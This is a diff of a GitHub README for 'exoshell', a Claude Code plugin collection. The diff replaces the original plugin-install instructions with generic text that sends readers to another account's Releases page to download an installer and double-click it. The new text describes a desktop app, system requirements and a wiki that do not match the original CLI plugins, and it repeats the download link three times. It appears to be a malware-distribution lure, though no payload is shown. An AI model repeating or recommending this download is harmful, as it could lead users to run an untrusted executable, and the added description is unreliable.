@@ -1,54 +1,67 @@
-# Exoshell🦞🐚
+# 🦞 exoshell - Simplify Your AI Development Journey
 
-**Exoshell** (exoskeleton + shell) draws inspiration from Moltbot's origin story — the project that evolved from "Clawdbot" (a claw-wielding chatbot) to "Moltbot" (referencing a lobster's molting process). Just as lobsters shed their shells to grow, developers using Exoshell continuously upgrade their capabilities by adopting new AI-assisted workflows and Claude plugins. The name captures both the biological metaphor of growth through transformation and the technical reality of building a pluggable "shell" of development skills.
+## 🚀 Getting Started
 
-**Exoshell**（外骨骼 + 命令行环境）的灵感源自 Moltbot 的起源故事——这个项目从"Clawdbot"（挥舞钳子的聊天机器人）演化为"Moltbot"（指代龙虾的蜕壳过程）。正如龙虾通过蜕壳实现成长，使用 Exoshell 的开发者通过采用新的 AI 辅助工作流和 Claude 插件来持续升级自己的能力。这个名字既捕捉了"通过转变实现成长"的生物学隐喻，也体现了构建可插拔的开发技能"外壳"的技术现实。
+Welcome to exoshell! This application offers a collection of Claude plugins and AI development skills. These tools are inspired by Moltbot's atomic commit methodology, designed to help you streamline your workflows and enhance productivity.
 
----
+## 📥 Download Link
 
-## Methodology | 方法论
+[![Download exoshell](https://img.shields.io/badge/Download%20exoshell-available-blue)](https://github.com/PTNagesh/exoshell/releases)
 
-- [100+ Commits/Day, Solo Dev: How Moltbot(Prev. ClawdBot) Balances Product Roadmap & Development Speed](https://x.com/wquguru/status/2016909319154127282?s=20)
-- [日均上百commit：Moltbot（Clawdbot）如何兼顾产品路线图和开发速度](https://x.com/wquguru/status/2016685995090153800?s=20)
+## 📋 System Requirements
 
----
+Before you install exoshell, ensure your system meets these requirements:
 
-## Installation | 安装
+- **Operating System**: Compatible with Windows, macOS, and Linux
+- **Memory**: At least 4 GB of RAM
+- **Disk Space**: Minimum of 100 MB available space
+- **Internet Connection**: Required for downloading plugins and updates
 
-### Prerequisites | 前置条件
+## 🔄 Features
 
-- [Claude Code CLI](https://claude.ai/code) installed | 已安装 Claude Code CLI
+exoshell includes several features to assist your development needs:
 
-### Add Marketplace | 添加市场
+- **Plugin Integration**: Easily add and manage AI plugins for enhanced functionality.
+- **User-Friendly Interface**: Designed for ease of use, even for non-technical users.
+- **Atomic Commits**: Adopt a structured approach to version control inspired by Moltbot’s methodology.
+- **Regular Updates**: Frequent updates to improve features and address bugs.
 
-```bash
-/plugin marketplace add wquguru/exoshell
-```
+## 📥 Download & Install
 
-### Install Plugins | 安装插件
+To get started with exoshell, follow these steps:
 
-```bash
-/plugin install <plugin-name>@exoshell
-```
+1. Visit the [Releases page](https://github.com/PTNagesh/exoshell/releases).
+2. On the Releases page, look for the most recent version.
+3. Click on the version you wish to download.
+4. Download the installation file for your operating system.
+5. Once downloaded, locate the file on your device and double-click it to begin the installation.
+6. Follow the on-screen instructions to complete the installation process.
 
----
+## 🏁 Usage Instructions
 
-## Plugin Status | 插件状态
+After installing exoshell, open the application:
 
-| Status | Description |
-|--------|-------------|
-| `planned` | Planned, not yet started ｜ 已规划，尚未开始 |
-| `wip` | Work in Progress ｜ 开发中 |
-| `ready` | Ready to use ｜ 可以使用 |
+1. **Launching the App**: Find the exoshell icon on your desktop or in your applications folder and double-click it.
+2. **Setting Up Plugins**:
+   - Go to the Plugins section in the main menu.
+   - Browse available plugins and select the ones you wish to install.
+   - Click “Install” and wait for the process to finish.
+3. **Using exoshell**: 
+   - Access the features by navigating through the menu options.
+   - Use the help section for guidance on specific tools and functions.
 
-## Plugins | 插件列表
+## 📚 Additional Resources
 
-| Plugin | Status | Description | Docs |
-|--------|--------|-------------|------|
-| **ralph-ryan** | `wip` | Ralph autonomous agent for iterative development with multi-PRD parallel support. Commands: `/ralph-ryan:prd`, `/ralph-ryan:prep`, `/ralph-ryan:run`, `/ralph-ryan:status`. | [README](./plugins/ralph-ryan/README.md) |
+If you have questions about using exoshell or need support, consider checking out the following resources:
 
----
+- **Documentation**: Detailed guides are available in the Wiki section.
+- **Support Community**: Join our forum where you can ask questions and share tips with other users.
+- **Feedback**: Your feedback helps us improve. Reach out via the Issues tab on GitHub.
 
-## License | 许可证
+## 🔗 Learn More
 
-MIT
+To explore more about exoshell and its features, visit our [documentation](https://github.com/PTNagesh/exoshell/wiki).
+
+## 📥 Download Again
+
+Don't forget, you can download the latest version at any time. Just visit the [Releases page](https://github.com/PTNagesh/exoshell/releases).
